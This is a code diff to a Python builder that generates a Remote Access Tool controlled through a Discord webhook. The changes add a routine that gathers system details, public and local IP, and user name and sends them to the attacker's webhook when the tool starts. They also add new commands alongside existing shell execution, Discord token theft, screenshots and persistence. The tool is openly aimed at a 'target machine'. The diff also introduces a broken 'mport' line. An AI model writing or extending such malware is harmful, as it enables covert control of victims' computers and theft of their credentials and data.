@@ -1,4 +1,4 @@
-import os, sys, time, base64, random, string
+mport os, sys, time, base64, random, string, platform, socket, psutil
 
 def run():
     print("\n" + "="*60)
@@ -6,8 +6,8 @@ def run():
     print("="*60)
     
     print("[!] This creates a Remote Access Tool controlled via Discord webhook")
-    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot")
-    print("[!] The RAT will check the webhook every 5 seconds for commands")
+    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot, pc_info")
+    print("[!] The RAT will send PC info when it starts")
     print("="*60)
     
     webhook = input("\nWebhook URL: ").strip()
@@ -28,7 +28,7 @@ def run():
     code = f'''#!/usr/bin/env python3
 # Discord RAT - Controlled via Webhook
 
-import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes
+import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, psutil, getpass
 
 WEBHOOK = "{webhook}"
 IS_WIN = platform.system() == "Windows"
@@ -45,7 +45,6 @@ def decrypt_cmd(data):
 
 def send(data):
     try:
-        # Split long messages
         if len(data) > 1900:
             for i in range(0, len(data), 1900):
                 requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
@@ -65,6 +64,51 @@ def execute_cmd(cmd):
         return "[!] Command timed out"
     except Exception as e:
         return f"[!] Error: {{str(e)}}"
+
+def get_pc_info():
+    info = []
+    info.append("=== SYSTEM INFORMATION ===")
+    info.append(f"Computer Name: {{platform.node()}}")
+    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
+    info.append(f"OS Version: {{platform.version()}}")
+    info.append(f"Architecture: {{platform.machine()}}")
+    info.append(f"User: {{os.getlogin()}}")
+    info.append(f"CPU: {{os.cpu_count()}} cores")
+    
+    try:
+        info.append(f"RAM: {{round(psutil.virtual_memory().total / 1024**3, 2)}} GB")
+        info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
+        info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
+        info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
+    except:
+        pass
+    
+    try:
+        info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
+        info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
+        info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
+        info.append(f"Disk Usage: {{psutil.disk_usage('/').percent}}%")
+    except:
+        pass
+    
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+        info.append(f"Public IP: {{ip}}")
+    except:
+        pass
+    
+    try:
+        hostname = socket.gethostname()
+        info.append(f"Local IP: {{socket.gethostbyname(hostname)}}")
+    except:
+        pass
+    
+    info.append(f"Python Version: {{sys.version}}")
+    info.append(f"Working Directory: {{os.getcwd()}}")
+    info.append(f"Processor: {{platform.processor()}}")
+    info.append("="*30)
+    
+    return "\\n".join(info)
 
 def steal_tokens():
     tokens = []
@@ -103,7 +147,6 @@ Working Directory: {{os.getcwd()}}
 """
     if IS_WIN:
         try:
-            import psutil
             info += f"RAM: {{psutil.virtual_memory().total / 1024**3:.2f}} GB"
         except:
             pass
@@ -143,9 +186,15 @@ def main():
         except:
             pass
     
-    # Send startup notification
+    # Send connection notification
     try:
-        send(f"[+] RAT Started on {{platform.node()}}")
+        send("[+] RAT CONNECTED!")
+        send("[+] Sending system information...")
+        time.sleep(1)
+        pc_info = get_pc_info()
+        send(pc_info)
+        send("[+] RAT is ready and waiting for commands")
+        send("[+] Type 'help' for commands")
     except:
         pass
     
@@ -172,10 +221,14 @@ def main():
                     info = get_system_info()
                     send(info)
                     
+                elif cmd == 'pc_info':
+                    info = get_pc_info()
+                    send(info)
+                    
                 elif cmd == 'screenshot':
                     img = take_screenshot()
                     if img:
-                        send(f"[+] Screenshot captured\\n{{img[:500]}}...")
+                        send("[+] Screenshot captured\\n{{img[:500]}}...")
                     else:
                         send("[!] Screenshot failed")
                         
@@ -183,15 +236,24 @@ def main():
                     persist_windows()
                     send("[+] Persistence enabled")
                     
+                elif cmd == 'connected':
+                    send("[+] RAT is connected and running")
+                    send("[+] Sending current system info...")
+                    pc_info = get_pc_info()
+                    send(pc_info)
+                    
                 elif cmd == 'help':
                     help_text = """
 === DISCORD RAT COMMANDS ===
 shell [cmd]  - Execute system command
 tokens       - Steal Discord tokens
 sysinfo      - Get system information
+pc_info      - Get detailed PC information
 screenshot   - Take screenshot
 persist      - Enable persistence
+connected    - Check if RAT is connected
 help         - Show this help
+exit         - Stop the RAT
 """
                     send(help_text)
                     
@@ -237,15 +299,20 @@ pause
     print("="*60)
     print("1. Run the RAT on the target machine:")
     print(f"   python {filename}.py")
-    print("\n2. Send commands via webhook:")
+    print("\n2. When the RAT starts, it will send:")
+    print("   - Connection notification")
+    print("   - PC information (OS, CPU, RAM, Disk, IP)")
+    print("\n3. Send commands via webhook:")
     print("   - Go to your Discord webhook URL")
     print("   - Send a message with the command")
-    print("\n3. Available commands:")
+    print("\n4. Available commands:")
     print("   shell [cmd]  - Execute system command")
     print("   tokens       - Steal Discord tokens")
     print("   sysinfo      - Get system information")
+    print("   pc_info      - Get detailed PC information")
     print("   screenshot   - Take screenshot")
     print("   persist      - Enable persistence")
+    print("   connected    - Check RAT status")
     print("   help         - Show help")
     print("   exit         - Stop the RAT")
     print("="*60)
